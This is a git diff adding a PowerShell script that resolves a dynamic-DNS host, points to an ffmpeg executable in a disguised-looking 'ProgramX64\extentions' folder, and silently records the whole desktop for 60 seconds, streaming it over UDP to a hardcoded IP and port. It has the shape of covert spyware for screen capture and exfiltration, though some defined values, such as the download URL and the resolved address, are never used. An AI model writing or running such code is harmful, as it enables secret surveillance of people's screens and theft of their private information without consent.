@@ -1,0 +1,28 @@
+$xx=$true
+while($xx){
+            
+            try {
+                
+                Clear-DnsClientCache
+                $dnsResult = Resolve-DnsName -Name "bibobas.duckdns.org" -NoHostsFile
+                $remoteIp = $dnsResult.IPAddress
+                $xx=$false
+               
+            } 
+            catch {
+                 
+                Start-Sleep -Seconds 1
+            }
+}
+Write-Host "$remoteIp"
+$DestinationIP = "192.168.1.51" 
+$Port = "1234"
+
+
+$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/ffmpeg.exe"
+$outPath = "C:\ProgramX64\extentions\ffmpeg.exe"
+C:\ProgramX64\extentions\ffmpeg.exe -f gdigrab -framerate 25 -i desktop `
+    -t 60 `
+    -vf "scale=-2:480,format=yuv420p" `
+    -vcodec libx264 -preset ultrafast -tune zerolatency `
+    -f mpegts "udp://$($DestinationIP):$($Port)?pkt_size=1316"
